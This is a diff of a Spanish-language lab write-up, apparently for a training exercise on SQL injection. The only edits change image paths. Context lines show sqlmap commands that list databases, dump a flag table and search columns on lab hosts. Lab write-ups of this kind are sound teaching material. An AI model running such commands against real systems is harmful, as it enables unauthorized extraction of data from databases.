@@ -26,7 +26,7 @@ Vemos cómo se llaman las bases de datos.
 sqlmap -u 'http://94.237.57.211:53268/case2.php' --data 'id=1*' --method POST -H 'Content-Type: application/x-www-form-urlencoded' --dbs
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Sabiendo como se llama realizamos lo siguiente para ver lo que contiene en dicha tabla.
 
@@ -106,7 +106,7 @@ sqlmap -u 'http://83.136.254.55:50741/case1.php?id=1' -T flag1 --dump --batch --
 sqlmap -u 'http://83.136.254.55:50741/case1.php?id=1' --batch --search -C "style"
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **What's the Kimberly user's password? (Case #1)**
 
